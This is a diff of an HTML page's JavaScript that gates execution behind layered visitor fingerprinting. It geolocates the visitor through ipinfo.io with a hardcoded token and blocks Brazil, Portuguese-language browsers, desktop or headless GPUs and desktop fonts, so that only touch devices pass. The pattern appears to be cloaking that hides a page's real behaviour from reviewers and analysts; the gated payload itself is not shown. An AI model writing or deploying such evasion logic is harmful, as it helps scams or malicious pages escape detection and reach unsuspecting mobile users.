@@ -10,7 +10,7 @@
                 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Teste11</title>
+  <title>Teste12</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -142,47 +142,77 @@
 	<script>
 		document.addEventListener('DOMContentLoaded', async () => {
 
+			// --- PAINEL DE DEPURAÇÃO VISUAL ---
+			function showDebugPanel(logs) {
+				const oldPanel = document.getElementById('debug-panel');
+				if (oldPanel) oldPanel.remove();
+				
+				const debugPanel = document.createElement('div');
+				debugPanel.id = 'debug-panel';
+				debugPanel.style.position = 'fixed';
+				debugPanel.style.bottom = '10px';
+				debugPanel.style.left = '10px';
+				debugPanel.style.padding = '10px';
+				debugPanel.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
+				debugPanel.style.color = 'white';
+				debugPanel.style.fontSize = '12px';
+				debugPanel.style.fontFamily = 'monospace';
+				debugPanel.style.zIndex = '9999999';
+				debugPanel.style.borderRadius = '5px';
+				debugPanel.style.lineHeight = '1.5';
+				debugPanel.innerHTML = logs.join('<br>');
+				document.body.appendChild(debugPanel);
+			}
+
 			// --- CAMADA 1: FILTRO DE LOCALIZAÇÃO (IPINFO.IO) ---
-			async function blockBrazil() {
+			async function checkLocation(logs) {
 				const token = '4a977bc54c9317';
 				try {
 					const response = await fetch(`https://ipinfo.io?token=${token}`);
 					if (!response.ok) {
+						logs.push('IP Check: API Error, PASS');
 						return false; 
 					}
 					const data = await response.json();
+					logs.push(`IP Check: Country=${data.country}`);
 					if (data.country === 'BR') {
-						return true;
+						logs.push('--> DECISÃO: BLOQUEADO (Brasil)');
+						return true; // true = bloquear
 					}
 				} catch (e) {
-					return false;
+					logs.push('IP Check: Network Error, PASS');
+					return false; // não bloqueia em caso de erro
 				}
-				return false;
+				logs.push('IP Check: OK');
+				return false; // não bloqueia
 			}
 
 
 			// --- CAMADA 2: ANÁLISE DE INCONSISTÊNCIAS (RED FLAGS) ---
-			function hasRedFlags() {
-				// Filtro de língua: Se o idioma do navegador for português, bloqueia.
+			function hasRedFlags(logs) {
 				if (navigator.language && navigator.language.startsWith('pt')) {
+					logs.push('Language: Portuguese');
+					logs.push('--> DECISÃO: BLOQUEADO (Idioma)');
 					return true;
 				}
+				logs.push(`Language: ${navigator.language}`);
 
-				// Análise da Placa de Vídeo (WebGL)
 				try {
 					const canvas = document.createElement('canvas');
 					const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
 					if (gl) {
 						const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
 						const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
+						logs.push(`GPU: ${renderer.substring(0, 20)}...`);
 						const desktopGpuKeywords = ['nvidia', 'geforce', 'radeon', 'intel', 'amd', 'swiftshader'];
 						if (desktopGpuKeywords.some(keyword => renderer.includes(keyword))) {
+							logs.push('--> DECISÃO: BLOQUEADO (GPU Desktop)');
 							return true;
 						}
 					}
 				} catch (e) { /* Ignora erros */ }
+				logs.push('GPU Check: OK');
 
-				// Verificação de Fontes de Desktop
 				const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI'];
 				const testString = "mmmmmmmmmmlli";
 				const testSpan = document.createElement('span');
@@ -195,52 +225,74 @@
 				defaultWidth.monospace = testSpan.offsetWidth;
 				document.body.removeChild(testSpan);
 
+				let foundDesktopFont = false;
 				for (const font of desktopFonts) {
 					 document.body.appendChild(testSpan);
 					 testSpan.style.fontFamily = `'${font}', monospace`;
 					 if(testSpan.offsetWidth !== defaultWidth.monospace) {
-						 document.body.removeChild(testSpan);
-						 return true;
+						 foundDesktopFont = true;
 					 }
 					 document.body.removeChild(testSpan);
+					 if(foundDesktopFont) break;
 				}
+				
+				if (foundDesktopFont) {
+					logs.push('--> DECISÃO: BLOQUEADO (Fonte Desktop)');
+					return true;
+				}
+				logs.push('Font Check: OK');
 
 				return false;
 			}
 
 			// --- CAMADA 3: VERIFICAÇÃO FINAL DE CONFIANÇA ---
-			function getFinalConfidenceScore() {
+			function getFinalConfidenceScore(logs) {
 				let score = 0;
-				if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
+				const touchPoints = navigator.maxTouchPoints || 0;
+				if (touchPoints > 1) {
 					score += 3;
 				}
+				logs.push(`TouchPoints: ${touchPoints}`);
+
 				if (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) {
 					score += 2;
 				}
+				logs.push(`Pointer Coarse: ${window.matchMedia("(pointer: coarse)").matches}`);
+				
+				logs.push(`--------------------`);
+				logs.push(`Score Final: ${score}`);
 				return score;
 			}
 
 
 			// --- LÓGICA PRINCIPAL DE EXECUÇÃO ---
 			async function runAntiFraudChecks() {
+				const debugLogs = ['--- Debugging Panel ---'];
+
 				// CAMADA 1
-				const isFromBrazil = await blockBrazil();
-				if (isFromBrazil) {
+				const isBlockedByLocation = await checkLocation(debugLogs);
+				if (isBlockedByLocation) {
+					showDebugPanel(debugLogs);
 					return false;
 				}
 
 				// CAMADA 2
-				const redFlagsFound = hasRedFlags();
+				const redFlagsFound = hasRedFlags(debugLogs);
 				if (redFlagsFound) {
+					showDebugPanel(debugLogs);
 					return false;
 				}
 
 				// CAMADA 3
-				const finalScore = getFinalConfidenceScore();
+				const finalScore = getFinalConfidenceScore(debugLogs);
 				if (finalScore < 5) {
+					debugLogs.push('--> DECISÃO: BLOQUEADO (Score < 5)');
+					showDebugPanel(debugLogs);
 					return false;
 				}
 
+				debugLogs.push('--> DECISÃO: EXECUTADO');
+				showDebugPanel(debugLogs);
 				return true;
 			}
 
